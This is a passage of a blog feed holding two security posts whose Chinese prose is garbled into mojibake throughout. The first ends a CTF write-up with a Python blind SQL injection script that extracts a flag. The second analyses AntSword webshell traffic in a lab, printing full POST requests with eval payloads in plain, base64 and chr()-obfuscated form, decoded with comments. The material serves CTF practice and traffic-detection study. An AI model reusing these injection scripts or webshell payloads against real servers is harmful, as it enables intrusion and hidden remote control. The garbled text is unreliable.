class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))=ascii(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;id&#x27;</span>: sqls</span><br><span class="line">        &#125;</span><br><span class="line">        res = r.post(url=url, data=data, headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hello&#x27;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<a href="https://blog.csdn.net/rfrder/article/details/109263584">https://blog.csdn.net/rfrder/article/details/109263584</a>è¿™ä¸ªå¤§ä½¬æƒ³åˆ°äº†striposçš„æ¼æ´</p><blockquote><p>è¿™æ—¶å€™æƒ³åˆ°striposå‡½æ•°çš„ä¸€ä¸ªæ¼æ´ã€‚å¦‚æœæ²¡æœ‰æ‰¾åˆ°çš„è¯è¿”å›çš„æ˜¯falseï¼Œå¦‚æœæ‰¾åˆ°äº†ä½†æ˜¯æ˜¯åœ¨å­—ç¬¦ä¸²çš„é¦–ä½ï¼Œè¿”å›çš„æ˜¯0ã€‚å¦‚æœåç«¯ç”¨äº†å¼±ç±»å‹æ¯”è¾ƒçš„è¯ï¼Œ0==falseï¼Œè¿™æ ·åé¢å°±å¯ä»¥ä½¿ç”¨è¢«è¿‡æ»¤çš„æŸä¸€ä¸ªå­—ç¬¦ä¸²äº†</p></blockquote><p>è¿›è¡Œå°è¯•ï¼Œ</p><p>é¦–å…ˆid=1unionï¼š</p><p>SQL Injection Checked.</p><p>å†è¯•è¯•id=union1unionï¼š</p><p>bool(false)</p><p>å¦‚æœè¿™ä¸ªé¢˜ç›®æŠŠæ‹¬å·,tab,ä»¥åŠå„ç§å¯ä»¥å……å½“ç©ºæ ¼çš„éƒ½ç»™è¿‡æ»¤äº†çš„è¯ï¼Œå°±ç”¨è¿™ç§æ–¹æ³•æ¥ç»•è¿‡ç©ºæ ¼çš„è¿‡æ»¤ã€‚</p><p>ä¸è¿‡ä¸çŸ¥é“ä¸ºå•¥ï¼Œæ¯æ¬¡è·‘å‡ºçš„flagéƒ½ä¸ä¸€æ ·ï¼Œå‘ƒå‘ƒå‘ƒï¼Œç„¶åéƒ½ä¸èƒ½è¿‡ã€‚ã€‚ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;d9a6fbce43f97d2164f1b3e&#125;</span><br><span class="line">flag&#123;d95e7a6fc1e43f7d164f414b&#125;</span><br><span class="line">flag&#123;d9e7a6fc1e43f7d214f41b3e&#125;</span><br><span class="line">flag&#123;d956fce443f9f57d14f414b&#125;</span><br></pre></td></tr></table></figure><p>åŸæ¥æ˜¯â€™-â€˜è¢«è¿‡æ»¤äº†ï¼Œæµ‹è¯•åˆ°-çš„æ—¶å€™ä¼šè¿”å›sqlæ³¨å…¥</p><p>æœåŠ¡å™¨å‡ºäº†ç‚¹å°æ„å¤–ï¼Œä¸èƒ½pushäº†ï¼Œcpuç»™çˆ†äº†ï¼Œä¸çŸ¥é“ä¸ºå•¥ã€‚ã€‚</p><p><img src="https://my-photos-test.oss-cn-hangzhou.aliyuncs.com/2021/20210927012625.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&quot;&gt;&lt;a href=&quot;#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 ååŒ—èµ›åŒº Day2 W</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="http://haorical.xyz/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="æµ‹è¯•å·¥å…·" scheme="http://haorical.xyz/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>èšå‰‘æµé‡åˆ†æ</title>
    <link href="http://haorical.xyz/posts/367c8d9/"/>
    <id>http://haorical.xyz/posts/367c8d9/</id>
    <published>2021-09-25T13:00:57.000Z</published>
    <updated>2021-09-25T15:47:35.381Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‡†å¤‡"><a href="#å‡†å¤‡" class="headerlink" title="å‡†å¤‡"></a>å‡†å¤‡</h2><p>é¶æœºä¸ºä¸€å°è¿è¡Œkaliçš„è™šæ‹Ÿæœºï¼Œæå‰å†™äº†ä¸€å¥è¯</p><span id="more"></span><h2 id="æµé‡åˆ†æ"><a href="#æµé‡åˆ†æ" class="headerlink" title="æµé‡åˆ†æ"></a>æµé‡åˆ†æ</h2><h3 id="æµ‹è¯•è¿æ¥"><a href="#æµ‹è¯•è¿æ¥" class="headerlink" title="æµ‹è¯•è¿æ¥"></a>æµ‹è¯•è¿æ¥</h3><p>å…ˆç”¨defaultç¼–ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 993</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%224eba6e362469%22%3Becho%20%40asenc(%24output)%3Becho%20%22b1c628%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼ŒUser-Agentå¾ˆæ˜æ˜¾çœ‹å‡ºæ˜¯èšå‰‘</p><p>urlè§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">cmd=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;<span class="keyword">return</span> <span class="variable">$out</span>;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$output</span>=ob_get_contents();<span class="comment">#è·å–ç¼“å­˜åŒºå†…å®¹</span></span><br><span class="line">    ob_end_clean();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;4eba6e362469&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;b1c628&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();<span class="comment"># æ‰“å¼€è¾“å‡ºæ§åˆ¶ç¼“å†²ï¼Œå°†éœ€è¦è¾“å‡ºçš„å†…å®¹å­˜å‚¨åœ¨å†…éƒ¨ç¼“å†²åŒºä¸­ï¼ŒRè¾“å‡ºåˆ°ç¼“å­˜åŒº</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">#è·å–è„šæœ¬æ‰§è¡Œè·¯å¾„</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>) <span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="comment">#è·å–æ–‡æ¡£ç³»ç»Ÿè·¯å¾„</span></span><br><span class="line">    <span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(substr(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="comment">#åˆ¤æ–­æ˜¯å¦ä¸ºwindowsç³»ç»Ÿä»¥åŠç›˜ç¬¦ï¼Œlinuxéƒ½æ˜¯/å¼€å§‹</span></span><br><span class="line">        <span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> <span class="variable">$L</span>)</span><br><span class="line">            <span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$R</span>.=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$u</span>=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">#posix_getpwuidé€šè¿‡ç”¨æˆ·IDè¿”å›æœ‰å…³ç”¨æˆ·çš„ä¿¡æ¯ </span></span><br><span class="line">    <span class="comment">#posix_geteuidè¿”å›å½“å‰è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ·ID </span></span><br><span class="line">    <span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:@get_current_user();<span class="comment">#è·å–ç”¨æˆ·å</span></span><br><span class="line">    <span class="variable">$R</span>.=php_uname();</span><br><span class="line">    <span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$s&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$R</span>;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>å…¶ä¸­cmdæ˜¯å¯†ç ï¼Œåé¢çš„æ˜¯è¦æ‰§è¡Œçš„phpå‘½ä»¤</p><p>æˆåŠŸè¿”å›æœåŠ¡å™¨ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;Linux e8088063b385 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64www-data</span><br></pre></td></tr></table></figure><p>æ¢æˆbase64ç¼–ç æµ‹è¯•ï¼Œè§£ç å™¨ä¹Ÿæ¢æˆbase64,æŠ¥æ–‡å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 970</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40eval(%40base64_decode(%24_POST%5Bo2bd4cb489ef4a%5D))%3B&amp;o2bd4cb489ef4a&#x3D;QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gIjlmNGNlZWYiO2VjaG8gQGFzZW5jKCRvdXRwdXQpO2VjaG8gIjJjOWFmNGVkODkzIjt9b2Jfc3RhcnQoKTt0cnl7JEQ9ZGlybmFtZSgkX1NFUlZFUlsiU0NSSVBUX0ZJTEVOQU1FIl0pO2lmKCREPT0iIikkRD1kaXJuYW1lKCRfU0VSVkVSWyJQQVRIX1RSQU5TTEFURUQiXSk7JFI9InskRH0JIjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJDIiwiWiIpYXMgJEwpaWYoaXNfZGlyKCJ7JEx9OiIpKSRSLj0ieyRMfToiO31lbHNleyRSLj0iLyI7fSRSLj0iCSI7JHU9KGZ1bmN0aW9uX2V4aXN0cygicG9zaXhfZ2V0ZWdpZCIpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6IiI7JHM9KCR1KT8kdVsibmFtZSJdOkBnZXRfY3VycmVudF91c2VyKCk7JFIuPXBocF91bmFtZSgpOyRSLj0iCXskc30iO2VjaG8gJFI7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure><p>urlè§£ç ï¼Œbase64è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cmd=@<span class="keyword">eval</span>(@base64_decode(<span class="variable">$_POST</span>[o2bd4cb489ef4a]));</span><br><span class="line">o2bd4cb489ef4a=</span><br><span class="line">@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);@set_time_limit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> @base64_encode(<span class="variable">$out</span>);</span><br><span class="line">    <span class="comment">#åªæœ‰è¿™ä¸€å¤„ä¸åŒï¼Œä¼šå°†è¿”å›çš„æ•°æ®æå‰è¿›è¡Œbase64åŠ å¯†</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;9f4ceef&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;2c9af4ed893&quot;</span>;&#125;ob_start();<span class="keyword">try</span>&#123;<span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(<span class="variable">$D</span>==<span class="string">&quot;&quot;</span>)<span class="variable">$D</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;PATH_TRANSLATED&quot;</span>]);<span class="variable">$R</span>=<span class="string">&quot;<span class="subst">&#123;$D&#125;</span>&quot;</span>;<span class="keyword">if</span>(substr(<span class="variable">$D</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span>)&#123;<span class="keyword">foreach</span>(range(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;Z&quot;</span>)<span class="keyword">as</span> <span class="variable">$L</span>)<span class="keyword">if</span>(is_dir(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>))<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;&#125;<span class="keyword">else</span>&#123;<span class="variable">$R</span>.=<span class="string">&quot;/&quot;</span>;&#125;<span class="variable">$R</span>.=<span class="string">&quot;&quot;</span>;<span class="variable">$u</span>=(function_exists(<span class="string">&quot;posix_getegid&quot;</span>))?@posix_getpwuid(@posix_geteuid()):<span class="string">&quot;&quot;</span>;<span class="variable">$s</span>=(<span class="variable">$u</span>)?<span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>]:@get_current_user();<span class="variable">$R</span>.=php_uname();<span class="variable">$R</span>.=<span class="string">&quot;<span class="subst">&#123;$s&#125;</span>&quot;</span>;<span class="keyword">echo</span> <span class="variable">$R</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;asoutput();<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><p>ç›¸å½“äºæ˜¯evalæ‰§è¡Œäº†ä¸ªeval posté‡Œé¢æ˜¯çœŸæ­£çš„å‘½ä»¤ï¼Œä»£ç åŸºæœ¬æ²¡å·®åˆ«</p><p>ç„¶åæµ‹è¯•chr</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 5473</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">cmd&#x3D;%40eVAl(cHr(64).ChR(105).ChR(110).ChR(105).ChR(95).ChR(115).ChR(101).ChR(116).ChR(40).ChR(34).ChR(100).ChR(105).ChR(115).ChR(112).ChR(108).ChR(97).ChR(121).ChR(95).ChR(101).ChR(114).ChR(114).ChR(111).ChR(114).ChR(115).ChR(34).ChR(44).ChR(32).ChR(34).ChR(48).ChR(34).ChR(41).ChR(59).ChR(64).ChR(115).ChR(101).ChR(116).ChR(95).ChR(116).ChR(105).ChR(109).ChR(101).ChR(95).ChR(108).ChR(105).ChR(109).ChR(105).ChR(116).ChR(40).ChR(48).ChR(41).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(41).ChR(123).ChR(114).ChR(101).ChR(116).ChR(117).ChR(114).ChR(110).ChR(32).ChR(36).ChR(111).ChR(117).ChR(116).ChR(59).ChR(125).ChR(59).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(123).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(61).ChR(111).ChR(98).ChR(95).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(111).ChR(110).ChR(116).ChR(101).ChR(110).ChR(116).ChR(115).ChR(40).ChR(41).ChR(59).ChR(111).ChR(98).ChR(95).ChR(101).ChR(110).ChR(100).ChR(95).ChR(99).ChR(108).ChR(101).ChR(97).ChR(110).ChR(40).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(49).ChR(55).ChR(99).ChR(54).ChR(56).ChR(54).ChR(48).ChR(100).ChR(56).ChR(55).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(64).ChR(97).ChR(115).ChR(101).ChR(110).ChR(99).ChR(40).ChR(36).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(41).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(101).ChR(51).ChR(57).ChR(57).ChR(99).ChR(34).ChR(59).ChR(125).ChR(111).ChR(98).ChR(95).ChR(115).ChR(116).ChR(97).ChR(114).ChR(116).ChR(40).ChR(41).ChR(59).ChR(116).ChR(114).ChR(121).ChR(123).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(83).ChR(67).ChR(82).ChR(73).ChR(80).ChR(84).ChR(95).ChR(70).ChR(73).ChR(76).ChR(69).ChR(78).ChR(65).ChR(77).ChR(69).ChR(34).ChR(93).ChR(41).ChR(59).ChR(105).ChR(102).ChR(40).ChR(36).ChR(68).ChR(61).ChR(61).ChR(34).ChR(34).ChR(41).ChR(36).ChR(68).ChR(61).ChR(100).ChR(105).ChR(114).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(36).ChR(95).ChR(83).ChR(69).ChR(82).ChR(86).ChR(69).ChR(82).ChR(91).ChR(34).ChR(80).ChR(65).ChR(84).ChR(72).ChR(95).ChR(84).ChR(82).ChR(65).ChR(78).ChR(83).ChR(76).ChR(65).ChR(84).ChR(69).ChR(68).ChR(34).ChR(93).ChR(41).ChR(59).ChR(36).ChR(82).ChR(61).ChR(34).ChR(123).ChR(36).ChR(68).ChR(125).ChR(9).ChR(34).ChR(59).ChR(105).ChR(102).ChR(40).ChR(115).ChR(117).ChR(98).ChR(115).ChR(116).ChR(114).ChR(40).ChR(36).ChR(68).ChR(44).ChR(48).ChR(44).ChR(49).ChR(41).ChR(33).ChR(61).ChR(34).ChR(47).ChR(34).ChR(41).ChR(123).ChR(102).ChR(111).ChR(114).ChR(101).ChR(97).ChR(99).ChR(104).ChR(40).ChR(114).ChR(97).ChR(110).ChR(103).ChR(101).ChR(40).ChR(34).ChR(67).ChR(34).ChR(44).ChR(34).ChR(90).ChR(34).ChR(41).ChR(97).ChR(115).ChR(32).ChR(36).ChR(76).ChR(41).ChR(105).ChR(102).ChR(40).ChR(105).ChR(115).ChR(95).ChR(100).ChR(105).ChR(114).ChR(40).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(41).ChR(41).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(123).ChR(36).ChR(76).ChR(125).ChR(58).ChR(34).ChR(59).ChR(125).ChR(101).ChR(108).ChR(115).ChR(101).ChR(123).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(47).ChR(34).ChR(59).ChR(125).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(34).ChR(59).ChR(36).ChR(117).ChR(61).ChR(40).ChR(102).ChR(117).ChR(110).ChR(99).ChR(116).ChR(105).ChR(111).ChR(110).ChR(95).ChR(101).ChR(120).ChR(105).ChR(115).ChR(116).ChR(115).ChR(40).ChR(34).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(103).ChR(105).ChR(100).ChR(34).ChR(41).ChR(41).ChR(63).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(112).ChR(119).ChR(117).ChR(105).ChR(100).ChR(40).ChR(64).ChR(112).ChR(111).ChR(115).ChR(105).ChR(120).ChR(95).ChR(103).ChR(101).ChR(116).ChR(101).ChR(117).ChR(105).ChR(100).ChR(40).ChR(41).ChR(41).ChR(58).ChR(34).ChR(34).ChR(59).ChR(36).ChR(115).ChR(61).ChR(40).ChR(36).ChR(117).ChR(41).ChR(63).ChR(36).ChR(117).ChR(91).ChR(34).ChR(110).ChR(97).ChR(109).ChR(101).ChR(34).ChR(93).ChR(58).ChR(64).ChR(103).ChR(101).ChR(116).ChR(95).ChR(99).ChR(117).ChR(114).ChR(114).ChR(101).ChR(110).ChR(116).ChR(95).ChR(117).ChR(115).ChR(101).ChR(114).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(112).ChR(104).ChR(112).ChR(95).ChR(117).ChR(110).ChR(97).ChR(109).ChR(101).ChR(40).ChR(41).ChR(59).ChR(36).ChR(82).ChR(46).ChR(61).ChR(34).ChR(9).ChR(123).ChR(36).ChR(115).ChR(125).ChR(34).ChR(59).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(36).ChR(82).ChR(59).ChR(59).ChR(125).ChR(99).ChR(97).ChR(116).ChR(99).ChR(104).ChR(40).ChR(69).ChR(120).ChR(99).ChR(101).ChR(112).ChR(116).ChR(105).ChR(111).ChR(110).ChR(32).ChR(36).ChR(101).ChR(41).ChR(123).ChR(101).ChR(99).ChR(104).ChR(111).ChR(32).ChR(34).ChR(69).ChR(82).ChR(82).ChR(79).ChR(82).ChR(58).ChR(47).ChR(47).ChR(34).ChR(46).ChR(36).ChR(101).ChR(45).ChR(62).ChR(103).ChR(101).ChR(116).ChR(77).ChR(101).ChR(115).ChR(115).ChR(97).ChR(103).ChR(101).ChR(40).ChR(41).ChR(59).ChR(125).ChR(59).ChR(97).ChR(115).ChR(111).ChR(117).ChR(116).ChR(112).ChR(117).ChR(116).ChR(40).ChR(41).ChR(59).ChR(100).ChR(105).ChR(101).ChR(40).ChR(41).ChR(59))%3B</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å‘½ä»¤æ˜¯é€šè¿‡chræ‹¼æ¥çš„ï¼Œchr16æ˜¯16ä½çš„ï¼Œå’Œè¿™ä¸ªç±»ä¼¼å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;shell0.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.217.128:100</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: antSword&#x2F;v2.1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 6462</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span 